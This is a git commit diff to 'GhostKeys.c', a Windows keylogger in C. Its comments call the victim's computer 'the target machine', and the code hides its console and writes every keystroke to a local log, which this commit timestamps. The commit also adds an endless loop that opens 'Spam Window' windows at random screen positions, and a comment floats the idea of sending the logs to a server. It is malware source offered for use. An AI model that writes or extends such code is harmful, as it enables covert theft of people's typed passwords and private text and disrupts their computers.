3d602a0d3d24ff318a6268261f753b5931c63d66
Ratintosh <thomas@heltonfamily.info>
2025-03-27 14:57:59 -0400

    Code update...

--- GhostKeys.c
+++ GhostKeys.c
@@ -1,14 +1,38 @@
 #include <stdio.h>
+#include <time.h>
 #include <windows.h>
 
 void logKey(int key, FILE* logfile);
 
+LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
+    if (msg == WM_DESTROY) PostQuitMessage(0);
+    return DefWindowProc(hwnd, msg, wParam, lParam);
+}
+
 int main() {
+    HINSTANCE hInstance = GetModuleHandle(NULL);
+    WNDCLASS wc = {0};
+    wc.lpfnWndProc = WndProc;
+    wc.hInstance = hInstance;
+    wc.lpszClassName = "SimpleWin";
+    RegisterClass(&wc);
+
     FILE* logfile;
     errno_t err = fopen_s(&logfile, "log.txt", "a+");
     if (err != 0 || logfile == NULL) {
         return 1; // Exit if file cannot be opened
     }
+
+
+    while (1) {
+        int x = rand() % 1920;  // Random X position
+        int y = rand() % 1080;  // Random Y position
+        HWND hwnd = CreateWindow("SimpleWin", "Spam Window", WS_OVERLAPPEDWINDOW,
+            x, y, 200, 150, NULL, NULL, hInstance, NULL);
+        ShowWindow(hwnd, SW_SHOW);
+        UpdateWindow(hwnd);
+    }
+
 
     // Hide the console window
     ShowWindow(GetConsoleWindow(), SW_HIDE);
@@ -34,6 +58,9 @@ int main() {
 // These logs are also stored locally on the target machine. 
 // Another idea would be to transmit them back to a server somewhere...
 void logKey(int key, FILE* logfile) {
+    SYSTEMTIME time;
+    GetLocalTime(&time);
+    fprintf(logfile, "[%02d:%02d:%02d]", time.wHour, time.wMinute, time.wSecond);
     switch (key) {
     case VK_BACK: fprintf(logfile, "[BACKSPACE]"); break;
     case VK_RETURN: fprintf(logfile, "[ENTER]\n"); break;
@@ -49,10 +76,10 @@ void logKey(int key, FILE* logfile) {
     case VK_DELETE: fprintf(logfile, "[DEL]"); break;
     default:
         if (key >= 32 && key <= 126) { // Printable ASCII characters
-            fprintf(logfile, "%c", key);
+            fprintf(logfile, "%c\n", key);
         }
         else {
-            fprintf(logfile, "[%d]", key); // Log other keys as keycodes
+            fprintf(logfile, "[%d]\n", key); // Log other keys as keycodes
         }
         break;
     }
